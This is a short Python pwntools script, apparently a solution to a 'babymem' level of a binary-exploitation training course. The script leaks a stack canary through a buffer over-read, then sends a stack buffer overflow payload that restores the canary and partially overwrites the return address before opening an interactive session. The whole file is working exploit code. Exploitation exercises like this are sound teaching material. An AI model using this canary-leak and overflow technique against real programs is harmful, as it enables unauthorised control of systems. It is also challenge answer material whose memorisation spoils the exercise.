for i in range(1, 20):
    from pwn import *
    from pwn import p64

    context.log_level = "error"

    pros = process("../Binaries/babymem_level12.1")

    payload = b"89\n"
    payload += b"REPEAT"
    payload += b"A" * 83

    pros.sendline(payload)
    pros.recvuntil(b"said: ")
    # pros.recv(89)
    canary = u64(pros.recvline().strip()[89:96].rjust(8, b"\x00"))
    print(hex(canary))

    payload = b"106\n"
    payload += b"A" * 88
    payload += p64(canary)
    payload += b"B" * 8
    payload += b"\xc2\x21"

    pros.sendline(payload)
    pros.interactive()
